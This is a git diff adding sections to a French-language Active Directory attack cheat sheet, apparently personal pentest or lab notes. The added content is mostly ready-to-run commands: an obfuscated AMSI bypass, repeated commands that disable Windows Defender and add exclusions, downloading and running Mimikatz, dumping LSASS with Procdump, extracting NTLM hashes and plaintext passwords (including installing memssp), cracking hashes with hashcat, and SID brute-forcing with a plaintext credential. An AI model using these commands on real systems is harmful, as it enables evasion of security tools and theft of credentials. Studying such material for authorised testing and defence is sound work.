@@ -488,6 +488,307 @@ Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de c
 
 
 
+## __AMSI BYPASS__
+
+> ATT&CK Tactic : Defense Evasion (TA0005) <br>
+> ATT&CK Technique ID : T1562.001 – Impair Defenses: Disable or Modify Tools <br>
+> ATT&CK Technique ID : T1027 – Obfuscated Files or Information <br>
+> Outils : amsi.fail, PowerView, PowerUp
+
+<br>
+
+![](img/amsi.png)
+
+
+AMSI (AntiMalware Scan Interface) est un ensemble d'API Windows permettant à toute application de s'intégrer à un antivirus (à condition que ce dernier fasse office de fournisseur AMSI). Windows Defender, comme de nombreuses solutions antivirus tierces, joue ce rôle. <br>
+En résumé, AMSI sert d'intermédiaire entre une application et un moteur antivirus. Prenons l'exemple de PowerShell : lorsqu'un utilisateur tente d'exécuter du code, PowerShell le soumet à AMSI avant son exécution. Si le moteur antivirus détecte un contenu malveillant, AMSI le signale et PowerShell n'exécute pas le code.
+
+<br>
+
+### Désactiver Defender, exclusion de "C:\Windows\Temp", exclut les extension .exe et .ps1 
+```powershell		
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+
+
+
+
+Si vous ne pouvez pas désactiver Defender, voici l'équivalent de la commande précédente mais obfusquée
+
+```powershell
+#Matt Graebers Reflection method 
+$bncYsK0MlQXwYafCQC=$null;$fR_nvfL="System.$(('Mänä'+'gémè'+'nt').noRMALiZe([cHAR](70)+[ChAr](111+101-101)+[chaR]([byTe]0x72)+[chaR]([bYtE]0x6d)+[Char]([ByTe]0x44)) -replace [CHaR]([BytE]0x5c)+[cHAR]([BYTE]0x70)+[char]([Byte]0x7b)+[CHaR]([BYtE]0x4d)+[cHAR]([byTe]0x6e)+[chaR](125)).$(('Á'+'û'+'t'+'ô'+'m'+'ä'+'t'+'ì'+'ô'+'n').NORmAlIze([cHaR]([Byte]0x46)+[Char](111)+[CHAR]([BYtE]0x72)+[cHaR](109)+[cHAr]([BytE]0x44)) -replace [ChAr](92*4/4)+[cHar](112*19/19)+[CHAr]([bYtE]0x7b)+[cHaR]([bYtE]0x4d)+[CHaR](110+34-34)+[chAR](125)).$([cHAR](65)+[CHaR]([bYTE]0x6d)+[cHaR]([BYTe]0x73)+[CHar](31+74)+[cHaR]([ByTE]0x55)+[chAR]([BYte]0x74)+[chaR](105)+[char](108*9/9)+[CHAR]([ByTe]0x73))";$vjzpibzqpxemahbiucfml="+[cHaR]([bYtE]0x70)+[ChAr]([ByTE]0x68)+[cHar](115*94/94)+[chAr](110*97/97)+[char]([ByTe]0x64)+[cHaR](79+21)+[CHar]([BYTE]0x67)+[CHAr]([bYte]0x7a)+[Char]([Byte]0x68)+[char](46+52)+[CHaR]([BYTE]0x7a)+[ChAr]([BYTE]0x64)+[cHAR](98)+[char]([bYTe]0x6e)+[CHaR](20+87)+[chaR](66+55)+[ChAR]([bYte]0x62)+[chaR]([ByTe]0x73)+[cHAR](118*110/110)+[ChAR](102*56/56)+[Char]([ByTe]0x77)+[cHar](112)";[Threading.Thread]::Sleep(127);[Ref].Assembly.GetType($fR_nvfL).GetField($([cHaR]([Byte]0x61)+[cHAr]([bYTe]0x6d)+[CHAR]([BYte]0x73)+[ChaR](105*91/91)+[CHAR](73+67-67)+[chAR]([BYTe]0x6e)+[CHaR]([BYtE]0x69)+[char]([ByTE]0x74)+[ChAr]([bYte]0x46)+[cHAR]([BytE]0x61)+[CHaR](105*29/29)+[cHaR](108+72-72)+[CHAR]([BYTe]0x65)+[cHAr](100)),"NonPublic,Static").SetValue($bncYsK0MlQXwYafCQC,$true);$ccynxqvpluwhsqrp="+('óx'+'xb'+'âg'+'zy'+'mw'+'zs'+'ín'+'ún'+'rh'+'ûw'+'pf'+'pr'+'qs'+'gd'+'n').normaLIZE([cHAr](4+66)+[cHar]([byTe]0x6f)+[CHaR](114)+[cHAr]([bYtE]0x6d)+[CHar]([Byte]0x44)) -replace [CHar]([BYtE]0x5c)+[CHAR](112*80/80)+[CHAr](65+58)+[cHAR](77+74-74)+[CHaR]([byTe]0x6e)+[ChAr](125)";[Threading.Thread]::Sleep(490)
+```
+
+
+
+
+---
+
+<br>
+
+
+
+
+
+## __PRIVILEGE ESCALATION__
+
+
+
+
+
+
+---
+
+<br>
+
+
+
+
+
+## __NTLM HASH EXTRACTION__
+
+> ATT&CK Tactic : Credential Access <br>
+> ATT&CK Technique ID : T1003.001-008 <br>
+> Outils : Mimikatz
+
+
+Un compte ayant des privilèges élévés sur le domaine doit toujour se trouver dans le **groupe "Protected Users"** (dans l'OU built-in Users) sinon ces identifiants seront stockés en cache lors de sa connexion sur une machine. Il sera possible d'extraire ses informations avec un outils comme Mimikatz.
+
+Les informations des identifiants en cache sont stockées dans le registre au sein de la clé : HKEY_LOCAL_MACHINE\Security\Cache
+
+
+<br>
+
+Afficher les tickets mis en cache sur la machine
+```bat
+klist
+```
+
+<br>
+
+
+
+
+> [!NOTE] Le processus **lsass.exe** (Local Security Authority SubSystem) gère des informations d'identifications qui sont stockées en mémoire.
+
+### Désactiver Defender, ajouter une exclusion pour "C:\Windows\Temp", exclut les extension .exe et .ps1
+```powershell		
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+```
+
+
+
+### Télécharger mimikatz
+
+![](img/meme.png)
+
+```powershell
+Invoke-WebRequest https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile "C:\Windows\Temp\mimi.zip"
+sl "C:\Windows\Temp"
+Expand-Archive mimi.zip
+```
+```powershell
+Start-Process .\mimi\x64\mimikatz.exe
+```
+
+### Élévations de privilèges système avec Mimikatz sur la machine locale (nécéssite droits local admin `SeDebugPrivilege`)
+```shell
+privilege::debug
+token::elevate
+```
+
+![](img/mimi.png)
+
+<br>
+
+### Extraire les hashs
+```shell
+sekurlsa::logonPasswords
+```
+```shell
+sekurlsa::logonPasswords full
+```
+
+![](img/mimi2.png)
+
+<br>
+
+### Cracker le hash NTLM
+```sh
+sudo hashcat -m 1000 -a 0 ntlmkatrina.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+![img](img/crackntlm.png)
+
+
+<br>
+
+### Réactiver toutes les protections Defender et supprimer les exclusions ajoutées.
+```shell
+Set-MpPreference `
+  -DisableRealtimeMonitoring $false `
+  -DisableBehaviorMonitoring $false `
+  -DisableIntrusionPreventionSystem $false `
+  -DisableIOAVProtection $false `
+  -DisableScriptScanning $false `
+  -DisablePrivacyMode $false `
+  -DisableBlockAtFirstSeen $false
+
+Remove-MpPreference -ExclusionExtension "ps1","exe"
+Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
+```
+
+
+
+
+
+---
+
+<br>
+
+
+
+
+
+## __PLAINTEXT CREDENTIALS__ 
+
+
+> ATT&CK Tactic : Credential Access <br>
+> ATT&CK Technique : OS Credential Dumping → LSASS Memory T1003.001-008 <br>
+> Outils : Procdump, Mimikatz
+
+<br>
+
+### Désactiver Defender, ajouter une exclusion pour "C:\Windows\Temp", exclut les extension .exe et .ps1
+```powershell		
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+```
+
+
+### Télécharger Procdump
+
+Procdump est un logiciel de la suite sysinternal Microsoft 
+```powershell
+mkdir C:\Windows\Temp\Dump
+iwr https://download.sysinternals.com/files/Procdump.zip -O C:\Windows\Temp\Dump\Procdump.zip
+sl C:\Windows\Temp\Dump
+Expand-Archive .\Procdump.zip
+```
+
+### Ouvrir un shell avec tout les privilèges activés
+
+Cette commande doit être exécutée en tant qu'administrateur (SeDebugPrivilege)
+```shell
+wmic /namespace:\\root\cimv2 path win32_process call create "powershell.exe"
+```
+```bat
+whoami /all
+```
+
+![](img/privi.png)
+
+
+<br>
+
+
+### Dumper lsass
+
+Exécuter lsass dans l'invite système powershell, et démarrer le programme lsass.exe
+```shell
+lsass.exe
+```
+
+
+Exécuter Procdump dans l'invite système CMD et envoyer le fichier dump dans C:\Windows\Temp\Procdump
+```bat
+cd C:\Windows\Temp\Dump\Procdump
+procdump64.exe -ma lsass.exe C:\Windows\Temp\Dump\lsadump.dmp
+```
+
+![](img/lsadump.png)
+
+
+### Afficher le dump en clair
+```bat
+cd C:\Windows\Temp\mimi\x64
+mimikatz.exe
+```
+Puis dans mimikatz indiquer le chemin du fichier dmp
+```shell
+!+
+!processprotect /process:lsass.exe /remove
+privilege::debug
+token::elevate
+sekurlsa::minidump C:\Temp\Dump\lsadump.dmp 
+sekurlsa::logonpasswords
+misc::memssp
+```
+
+![](img/privdeb.png)
+
+
+Toutes les sessions utilisateurs et authentifications sur cette machine auront leurs identifiants capturés en clair <br>
+Il faudra afficher les logs ici :
+```powershell
+gc c:\windows\system32\mimilsa.log
+```
+
+![](img/clearpswd.png)
+
+
+
+
+---
+
+<br>
+
+
+
+## __KERBEROS RELAY__
+
+> ATT&CK Tactic : Lateral Movement / Privilege Escalation <br>
+> ATT&CK Technique ID : T1557 – Adversary-in-the-Middle
+> Outils : krbrelayx.py
+
+
+
+
+
+
+
+
+---
+
+<br>
+
+
+
+
+
+## __Trouver les SID des utilisateurs et groupes__
+
+bruteforce the Windows SID through [MS-LSAT] MSRPC Interface 
+
+> Outils : Impacket-lookupsid
+
+
+```sh
+impacket-lookupsid KATRINA_RUTLEDGE:Hacker1@10.0.0.1
+```
+
+![](img/lookup.png)
+
+
+
+
+
+
+---
+
+<br>
+
+
+
 
 
 # __BLOODHOUND__
